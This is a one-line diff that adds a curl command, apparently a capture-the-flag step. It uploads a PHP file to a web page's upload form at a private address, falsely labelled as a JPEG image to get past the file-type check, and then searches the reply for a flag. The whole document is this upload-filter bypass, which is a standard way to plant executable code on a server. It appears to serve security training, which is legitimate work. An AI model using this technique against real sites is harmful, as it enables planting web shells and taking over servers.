@@ -1,0 +1,1 @@
+curl -v -F "Upload=send" -H 'Content-Type: multipart/form-data' -F "uploaded=@i.php;type=image/jpeg" 'http://10.11.200.17/?page=upload' | grep flag
